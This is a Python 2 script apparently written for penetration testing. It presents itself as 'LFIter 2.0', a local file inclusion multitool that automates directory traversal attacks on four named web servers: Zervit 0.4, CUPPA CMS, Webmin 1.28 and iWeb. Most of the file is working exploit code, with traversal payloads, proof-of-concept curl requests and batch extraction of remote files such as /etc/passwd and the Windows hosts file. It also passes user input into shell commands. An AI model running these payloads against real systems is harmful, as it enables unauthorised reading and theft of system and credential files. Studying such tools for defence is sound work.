#!/usr/bin/python
# coding: utf-8

import os, re, sys, fileinput, subprocess, argparse, base64
from termcolor import colored as cl
# from threading import Thread # todo add threading!!!

def banner(name=None):
    return '''
   ---------------------------------------------------------------
''' + cl(
'''  ██╗     ███████╗██╗████████╗███████╗██████╗  ██████╗     ██████╗
  ██║     ██╔════╝██║╚══██╔══╝██╔════╝██╔══██╗ ╚════██╗   ██╔═████╗
  ██║     █████╗  ██║   ██║   █████╗  ██████╔╝  █████╔╝   ██║██╔██║
  ██║     ██╔══╝  ██║   ██║   ██╔══╝  ██╔══██╗ ██╔═══╝    ████╔╝██║
  ███████╗██║     ██║   ██║   ███████╗██║  ██║ ███████╗██╗╚██████╔╝
  ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚══════╝╚═╝ ╚═════╝
''', 'red') + '''   ------------------------------------------------ By 3mrgnc3 ---
   2.0.1 ALPHA
   
   LFIter 2.0 Local File Include (LFI) MultiTool
   Auto File Extractor & Username Bruteforcer
   
   ===Examples===================================================
   lfitr2.py 172.16.10.1 -list win-paths.txt
   lfitr2.py 172.16.10.1 -path /windows/system32/drivers/etc/hosts
   lfitr2.py 172.16.10.1 -list win-paths.txt -port 8008
   lfitr2.py 172.16.10.1 -path /BOOT.INI -out /root/report/host      
   ==============================================================    
                                                                     
   Many Web Servers are vulnerable to remote directory traversal     
   attacks.
   
      FEATURES:
        
        1. Support For Multiple Server Types.
        2. Print Remote Files in local Terminal.
        3. Batch Extract Files Using A Word list.
        4. Brute Force Usernames Using A Word list [TO DO!]
        
   Collected Files Are Saved In the ./[host-ip]-files/ Directory
   --------------------------------------------------------------
    ref:
    https://owasp.org/index.php/Testing_for_Local_File_Inclusion
    --------------------------------------------------------------                         
'''
def targets(name=None):
    return cl('''
    TARGETS:''', 'red') + cl(''' (-trgt)
        
        [ zervit = Zervit 0.4 for Windows ]
        [ cuppa  = CUPPA CMS vb.0..1 for FreeBSD ]
        [ wbm128 = Webmin 1.28 for Fedora Core 4 ]
        [ iweb   = Ashley Brown iWeb Server for Windows ]
    ''','white')
pars = argparse.ArgumentParser(description="", usage=banner())
pars.add_argument('ip', nargs='+', help='Target IP Address')
pars.add_argument('-port', nargs='?', default=80, help='Alt Port')
pars.add_argument('-trgt', nargs='?', default='?', help='Target Server Application [Default: None]')
pars.add_argument('-path', nargs='?', type=str, default='/windows/system32/drivers/etc/hosts', help='Windows Filepath [Default: win/sys32/drvrs/etc/hosts]')
pars.add_argument('-list', nargs='?', type=argparse.FileType('r'), help='Filepaths To Process From A File')
#pars.add_argument('-usrs', nargs='?', type=argparse.FileType('r'), help='Usernames To Process From A File') # TO DO
pars.add_argument('-outd', nargs='?', default='-files/', help='Alt Output Dir [Default: ./[host_ip]-files/]')
pars.add_argument('-agnt', nargs='?', default='Visit https://3mrgnc.ninja', help='Alt User Agent [Default: Visit https://3mrgnc.ninja]')
pars.add_argument('--ssl', nargs='?', default='http', const='https', help='enable https flag [Default: http]')

############################################
# Parse The Arguments Passed To The Script #
############################################
args = pars.parse_args()

host = str(args.ip)[2:-2]
prto = str(args.ssl)
prt  = str(args.port)
trgt = str(args.trgt)
outd = host + str(args.outd)

if trgt == '?':
    print targets()
    exit()

#####################################################
# Seperate The Remote Path From The Remote Filename #
#####################################################
pt = args.path
rpath, rfile = os.path.split(pt)

########################################################
# Create Directory To Store Files If It Does Not Exist #
########################################################
fp = outd + rfile
if not os.path.exists(outd):
    os.makedirs(outd)
############################
# Custom User-Agent Option #
############################
header = " -H 'User-Agent: " + args.agnt + "' "
dpath = '/windows/system32/drivers/etc'
oprs   = "Windows"
###############################################################################################################################
# Define Specific Target Server Applications                                                                                  #
# ADD PARAMETERS HERE IF YOU WISH TO ADD SERVER APPS VULNERABLE TO LFI, BE SURE TO CHECK '404' & 'Failure' ERRORS TOO THOUGH! #
###############################################################################################################################
try:
    ##########################
    # Zervit 0.4 For Windows #
    ##########################
    if trgt == "zervit":
        oprs = "Windows"
        trv     = "?../../../../../../../../../../../../../../.."
        sta     = "curl -s --insecure " + header + " " + prto + "://" + host + ":" + prt + "/" + rfile + trv
        #stb     = "'"
        getrqt  = sta + rpath + "/" + rfile #+ stb
        # POC curl http://172.16.0.10:8008/hosts?../../../../../../../../../../windows/system32/drivers/etc/hosts
        print(cl("[+] ", "green") + cl('Targeting : Zervit 0.4 on ' + oprs, "white"))
    #################################
    # CUPPA CMS vb.0..1 for FreeBSD #
    #################################
    elif trgt == "cuppa":
        oprs    = "FreeBSD"
        if rpath == dpath:
            rpath   = "/etc"
            rfile   = "passwd"
        trv     = "administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../../../../../../.."
        sta     = "curl -s --insecure " + header + " " + prto + "://" + host + ":" + prt + "/" + trv
        #stb     = " | tail -n 2 | cut -d'<' -f1 | xargs | base64 -d -"
        getrqt  = sta + rpath + "/" + rfile
        # POC curl 'http://10.11.1.116:80/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd
        print(cl("[+] ", "green") + cl('Targeting : CUPPA CMS vb.0..1 on ' + oprs, "white"))
    #################################
    # Webmin 1.28 for Fedora Core 4 #
    #################################
    elif trgt == "wbm128":
        oprs    = "Fedora"
        if rpath == dpath:
            rpath   = "/etc"
            rfile   = "passwd"
        prt = "10000"
        trv     = "unauthenticated//..%01/..%01/..%01/..%01/..%01"
        sta     = "curl -s --insecure " + header + " " + prto + "://" + host + ":" + prt + "/" + trv
        getrqt  = sta + rpath + "/" + rfile
        # POC curl http://10.11.1.141:10000/unauthenticated//..%01/..%01/..%01/..%01/..%01/etc/passwd
        print(cl("[+] ", "green") + cl('Targeting : Webmin 1.28 on ' + oprs, "white"))
    ########################################
    # Ashley Brown iWeb Server For Windows #
    ########################################
    elif trgt == "iweb":
        oprs = "Windows"
        trv     = "..%5C..%5C..%5C..%5C..%5C..%5C"
        sta     = "curl -s --insecure " + header + " " + prto + "://" + host + ":" + prt + "/" + rfile + trv
        #stb     = "'"
        getrqt  = sta + rpath + "/" + rfile #+ stb
        # POC curl http://172.16.0.10/..%5C..%5C..%5C..%5C..%5C..%5C/windows/system32/drivers/etc/hosts
        print(cl("[+] ", "green") + cl('Targeting : Ashley Brown iWeb Server on ' + oprs, "white"))
    ##################################################
    # Placeholder. Other Targets To Be Added Soon... #
    ##################################################
    elif trgt == 'other':
        print(cl("[!] ", "red") + cl('Targeting : Placeholder. Other Targets To Be Added Soon...', "white"))
        sys.exit(-1)
    else:
        print((cl("[!] ", "red") + cl('Please Supply A Valid Target Server Application', "white")) +  cl("\n[!] ", "red") + cl('Use [-trgt ?] for a list of Supported Target Applications\n', "white"))
        sys.exit(-1)
    ###########################################################################
    # Read In The Filepaths From The File Passed To List If Given As Argument #
    ###########################################################################
    if args.list != None:
        for line in args.list:
            ###################################
            # TODO! fix for \ slashes to work #
            ###################################            
#            if '\\' in  line:
#                print(line.rpartition('\\'))
#                #rpath, rfile = line.rpartition('\\')
#            else:
            rpath, rfile = os.path.split(line)
            rfile = rfile[:-1]
            fp = outd + rfile
            status = "found"
            getrqt  = sta + rpath + "/" + rfile
            data   = subprocess.Popen(getrqt, shell=True, stdout=subprocess.PIPE)
            output = data.stdout.read()
            #dsize  = str(sys.getsizeof(output))
            #############################################
            #print(getrqt) # UN-COMMENT FOR DEBUGGING   #
            #print("for line in args.list = " + line)   #
            #############################################
            try:
                ############################################################################
                # ADD MORE CLAUSES HERE AND BELOW WHERE REQUIRED IF NEW TARGET ADDED ABOVE #
                ############################################################################
                if "404 Not Found" in output:
                    status = "404"
                elif "Error - File not found" in output:
                    status = "404"
                elif "failed to open stream" in output:
                    status = "404"
                elif "403 Unauthorized" in output:
                    status = "403"
                elif status == "found":
                    if (trgt == "cuppa"):
                        output = re.findall("(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4})", output)
                        output =  base64.b64decode(str(output[-3]))
                    dsize  = str(sys.getsizeof(output))
                    f = open(fp, "w")
                    f.write(output)
                    f = open(fp, "r")
                    f.close()
                    print(cl("[*]", "blue") + cl(" [" + rfile + "] Found On [" + host + "]. Saved In ./" + outd + rfile + " Size:" + dsize + " bytes", "green"))
            except IOError:
                    print(cl("[!]", "red") + cl(" Please Supply A Valid Filename After The Path!", "white"))
    else:
        pt = str(args.path)
        rpath, rfile = os.path.split(pt)
        data = subprocess.Popen(getrqt, shell=True, stdout=subprocess.PIPE)
        output = data.stdout.read()
        #############################################
        #print(getrqt) # UN-COMMENT FOR DEBUGGING   #
        #print("Type = " + str(type(output)))       #
        #############################################

        ############################################################################
        # ADD MORE CLAUSES HERE AND BELOW WHERE REQUIRED IF NEW TARGET ADDED ABOVE #
        ############################################################################
        if "404 Not Found" in output:
        # Display File Not Found Error Message
            print cl("[!]", "red") + cl(" [" + rfile + "] Not Found on [" + host + "]", "white")
            exit()
        elif "failed to open stream" in output:
        # Display File Not Found Error Message
            print cl("[!]", "red") + cl(" [" + rfile + "] Not Found on [" + host + "]", "white")
            exit()
        elif "403 Unauthorized" in output:
            # Display Unauthorized  Error Message
            print cl("[!]", "red") + cl(" [" + rfile + "] Access Unauthorized [" + host + "]", "cyan")
            exit()
        try:
            # Write To Directory & Display Contents Of The File
            ####################################################
            f = open(fp, "w")
            f.write(output)
            f = open(fp, "r")
            print cl(f.read(), "green")
            f.close()
        except IOError:
            print cl("[!]", "red") + cl(" Please Supply A Valid Filename After The Path!", "white")
except KeyboardInterrupt:
    print cl("\n[!]", "red") + cl(" Program Interupted", "white")

exit()
